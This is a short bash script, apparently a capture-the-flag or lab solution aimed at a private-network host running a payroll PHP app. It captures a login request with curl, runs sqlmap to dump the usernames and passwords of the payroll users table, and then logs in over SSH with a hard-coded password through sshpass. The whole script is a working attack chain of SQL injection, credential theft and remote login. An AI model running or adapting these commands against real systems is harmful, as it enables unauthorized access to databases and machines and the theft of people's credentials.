#!/bin/bash

curl -H "Content-Type: text/plain" http://192.168.100.86/payroll_app.php --trace-ascii /dev/stdout -d "user=123&password=345&s=OK" POST | head -n 12 | grep : | awk '{print $2,$3,$4}' > request.txt
sqlmap -r request.txt --batch -D payroll -T users -C username,password --dump

PASSWORD=help_me_obiwan
sshpass -p $PASSWORD ssh -q leia_organa@192.168.100.86 'groups'
